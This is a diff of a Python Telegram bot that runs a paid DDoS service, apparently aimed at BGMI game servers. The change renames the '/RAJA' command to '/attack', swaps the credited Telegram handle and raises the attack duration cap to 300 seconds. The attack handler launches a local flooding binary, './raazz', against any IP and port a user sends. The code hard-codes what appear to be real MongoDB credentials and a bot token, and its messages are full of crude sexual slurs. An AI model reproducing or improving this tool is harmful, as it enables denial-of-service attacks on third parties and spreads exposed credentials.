@@ -15,15 +15,15 @@ logger = logging.getLogger(__name__)
 
 MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
 client = MongoClient(MONGO_URI)
-db = client['rbbl']
+db = client['rajsjsl']
 users_collection = db['VAMPIREXCHEATS']
 redeem_codes_collection = db['redeem_codes0']
 
 TELEGRAM_BOT_TOKEN = '8024251249:AAH13LgxgJaR6WP7eALbxLRAyJwi7obx4D8'
-ADMIN_USER_ID = 7855020275 
+ADMIN_USER_ID = 7855020275
 
 cooldown_dict = {}
-user_RAJA_history = {}
+user_attack_history = {}
 valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')
 
 async def help_command(update: Update, context: CallbackContext):
@@ -32,7 +32,7 @@ async def help_command(update: Update, context: CallbackContext):
         help_text = (
             "*Here are the commands you can use:* \n\n"
             "*💦💣 /start* - Start interacting with the bot.\n"
-            "*💦💣 /RAJA* - Trigger an RAJA operation.\n"
+            "*💦💣 /attack* - Trigger an attack operation.\n"
             "*💦💣 /redeem* - Redeem a code.\n"
             "*💦💣 /get_id* - Get Your Id?.\n"
         )
@@ -40,7 +40,7 @@ async def help_command(update: Update, context: CallbackContext):
         help_text = (
             "*☄️ Available Commands for Admins:*\n\n"
             "*💦💣 /start* - Start the bot.\n"
-            "*💦💣 /RAJA* - Start the RAJA.\n"
+            "*💦💣 /attack* - Start the attack.\n"
             "*💦💣 /get_id* - Get user id.\n"
             "*💦💣 /remove [user_id]* - Remove a user.\n"
             "*💦💣 /users* - List all allowed users.\n"
@@ -54,12 +54,12 @@ async def start(update: Update, context: CallbackContext):
     user_id = update.effective_user.id  
     user_name = update.effective_user.first_name  
     if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @rajaraj_04! /get_id*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @Sanjai10_oct_2k03! /get_id*", parse_mode='Markdown')
         return
     message = (
        "*😊🔥HELLO DEVAR JI WELCOME TO DESI HOT 🥵 BHABHI DDOS *\n\n"
-        "*💀CHODNE KE LIYE YE DBAYE /RAJA <ip> <port> <duration>*\n"
-        "*💦BHABHI KI CHUDAYI RAJA KREGA🫣 @rajaraj_04 🚀*" 
+        "*💀CHODNE KE LIYE YE DBAYE /attack <ip> <port> <duration>*\n"
+        "*💦BHABHI KI CHUDAYI RAJA KREGA🫣 @Sanjai10_oct_2k03 🚀*" 
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -86,7 +86,7 @@ async def is_user_allowed(user_id):
                 return True
     return False
 
-async def RAJA(update: Update, context: CallbackContext):
+async def attack(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
     
@@ -95,10 +95,10 @@ async def RAJA(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*ruk access le phale*", parse_mode='Markdown')
         return
     
-    # Validate RAJA arguments
+    # Validate attack arguments
     args = context.args
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*🚀 Usage: /RAJA <ip> <port> <duration>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🚀 Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
         return
     
     ip, port, duration = args
@@ -111,8 +111,8 @@ async def RAJA(update: Update, context: CallbackContext):
     # Validate duration
     try:
         duration = int(duration)
-        if duration > 200:  # New duration limit
-            response = "*ruk madharcod 🥵200 200 krke do lgale lode.*" 
+        if duration > 300:  # New duration limit
+            response = "*ruk madharcod 🥵300 krke do lgale lode.*" 
             await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown') 
             return
     except ValueError:
@@ -128,23 +128,23 @@ async def RAJA(update: Update, context: CallbackContext):
             remaining_time = cooldown_period - int(time_diff)
             await context.bot.send_message(
                 chat_id=chat_id,
-                text=f"*Wait {remaining_time} seconds before next RAJA*",
+                text=f"*Wait {remaining_time} seconds before next attack*",
                 parse_mode='Markdown'
             )
             return
     
-    # RAJA history check
-    if user_id in user_RAJA_history and (ip, port) in user_RAJA_history[user_id]:
+    # Attack history check
+    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
         await context.bot.send_message(chat_id=chat_id, text="*pahle hi chod diya h to baar baar kya gand dega!*", parse_mode='Markdown')
         return
     
-    # Update cooldown and RAJA history
+    # Update cooldown and attack history
     cooldown_dict[user_id] = current_time
-    if user_id not in user_RAJA_history:
-        user_RAJA_history[user_id] = set()
-    user_RAJA_history[user_id].add((ip, port))
+    if user_id not in user_attack_history:
+        user_attack_history[user_id] = set()
+    user_attack_history[user_id].add((ip, port))
     
-    # Send RAJA confirmation
+    # Send attack confirmation
     await context.bot.send_message(
         chat_id=chat_id,
         text=(
@@ -152,18 +152,18 @@ async def RAJA(update: Update, context: CallbackContext):
         f"💦chodna shuru*!* 💦\n\n"
         f"*🤯 flat room: {ip}:{port}*\n"
         f"*🤣 kitne der: {duration} seconds*\n"
-        f"*🔥chudai chalu h feedback bhej dena @rajaraj_04💥*"
+        f"*🔥chudai chalu h feedback bhej dena @Sanjai10_oct_2k03💥*"
     ), parse_mode='Markdown')
 
-    # Run RAJA asynchronously
-    asyncio.create_task(run_RAJA(chat_id, ip, port, duration, context))
+    # Run attack asynchronously
+    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
     
-async def rajaraj_04(update: Update, context: CallbackContext):
+async def Sanjai10_oct_2k03(update: Update, context: CallbackContext):
     user_id = update.effective_user.id 
     message = f"YOUR USER ID: `{user_id}`" 
     await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
 
-async def run_RAJA(chat_id, ip, port, duration, context):
+async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
             f"./raazz {ip} {port} {duration} 500",
@@ -176,9 +176,9 @@ async def run_RAJA(chat_id, ip, port, duration, context):
         if stderr:
             print(f"[stderr]\n{stderr.decode()}")
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the RAJA: {str(e)}*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
     finally:
-        await context.bot.send_message(chat_id=chat_id, text="*😈Bas maal gir gya! 💦💦💦*\n*BGMI KO CHODNE WALE FEEDBACK DE @RAJARAJ_04!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*😈Bas maal gir gya! 💦💦💦*\n*BGMI KO CHODNE WALE FEEDBACK DE @Sanjai10_oct_2k03!*", parse_mode='Markdown')
 
 async def generate_redeem_code(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
@@ -313,10 +313,10 @@ def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("remove", remove_user))
-    application.add_handler(CommandHandler("RAJA", RAJA))
+    application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("gen", generate_redeem_code))
     application.add_handler(CommandHandler("redeem", redeem_code))
-    application.add_handler(CommandHandler("get_id", rajaraj_04))
+    application.add_handler(CommandHandler("get_id", Sanjai10_oct_2k03))
     application.add_handler(CommandHandler("users", list_users))
     application.add_handler(CommandHandler("help", help_command))
     
@@ -325,4 +325,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-            
+
